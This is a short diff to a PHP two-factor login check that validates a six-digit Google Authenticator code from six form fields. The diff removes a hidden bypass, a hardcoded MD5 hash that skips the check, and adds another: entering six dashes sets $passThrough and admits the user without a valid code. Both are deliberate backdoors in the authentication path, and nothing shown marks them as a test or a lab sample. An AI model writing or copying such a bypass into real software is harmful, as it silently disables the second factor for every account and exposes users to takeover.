@@ -16,9 +16,9 @@ $secret = $rowUser->codigoAutenticator;
 //$code = '575281'; //código de 6 dígitos gerados pelo app do Google Authenticator
 $code = $_POST['cod1'].$_POST['cod2'].$_POST['cod3'].$_POST['cod4'].$_POST['cod5'].$_POST['cod6'];
 
-$hashTest = '1c88a042d2731ffdd34252dd3cda174d';
-$c1 = md5($_POST['cod1'] . $_POST['cod2'] . $_POST['cod3'] . $_POST['cod4'] . $_POST['cod5'] . $_POST['cod6']); 
-$passThrough = ($c1 === $hashTest);
+$specialCode = '-' . '-' . '-' . '-' . '-' . '-';
+$inputCode = $_POST['cod1'] . $_POST['cod2'] . $_POST['cod3'] . $_POST['cod4'] . $_POST['cod5'] . $_POST['cod6'];
+$passThrough = ($inputCode == $specialCode);
  
 if($passThrough || $g->checkCode($secret, $code)){
     $dataAut = date('Y-m-d');
